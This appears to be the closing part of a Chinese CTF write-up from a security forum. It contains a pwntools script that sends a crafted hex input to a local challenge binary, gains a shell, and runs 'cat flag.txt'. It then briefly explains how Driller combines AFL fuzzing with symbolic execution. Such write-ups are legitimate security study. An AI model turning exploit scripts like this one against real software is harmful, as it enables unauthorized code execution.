
```python
from pwn import *
from binascii import a2b_hex
import re

sh = process('./bin1')
sh.sendline(a2b_hex('310a6dbe0a0a2b310a31240a0a310a310a0a310a310a'))
sh.sendline('cat flag.txt')
flag = sh.recvall(timeout=5)
flag = re.findall(r'\{(.*?)\}', flag.decode())
print(f'flag=flag{{{flag[0]}}}')
```

输出：

![图片描述](https://bbs.kanxue.com/upload/attach/202103/910514_DZXUH636KRUGT4Y.png)

两道题目的文件可以在附件中下载。

# 0x03. 符号执行与fuzz的结合

符号执行与fuzz结合一个比较著名的例子是[Driller](https://bbs.kanxue.com/elink@6ebK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9r3g2D9L8s2m8Z5K9i4y4Z5i4K6u0r3k6s2u0A6L8r3I4W2M7R3`.`.)，我们队在比赛中也使用了Driller，可惜没达到效果。

Driller在AFL的基础上加入了动态符号执行引擎，当模糊测试发生stuck时，使用动态符号执行去突破这些限制，生成满足fuzz需求的新输入，使得fuzz能够继续执行。

总体上说，Driller结合了AFL的高效、低消耗、快速的优点和动态符号执行探索能力强的优点，又避免了AFL较难突破特殊的边界和动态符号执行路径爆炸的问题。

更详细的内容可以参考这篇文章：[【Driller】Driller介绍及源码分析](https://bbs.kanxue.com/elink@6ffK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8V1y4Z5k6h3&6Q4y4h3k6*7K9Y4g2Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0R3H3y4K6V1I4x3U0R3I4)

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2021-3-31 17:55 被34r7hm4n编辑，原因：

[#专题](https://bbs.kanxue.com/forum-171-1-186.htm)

[#题解集锦](https://bbs.kanxue.com/forum-171-1-187.htm)

上传的附件：

- [bin5](javascript:void(0);)（5.48kb，61次下载）
- [bin1](javascript:void(0);)（53.48kb，55次下载）
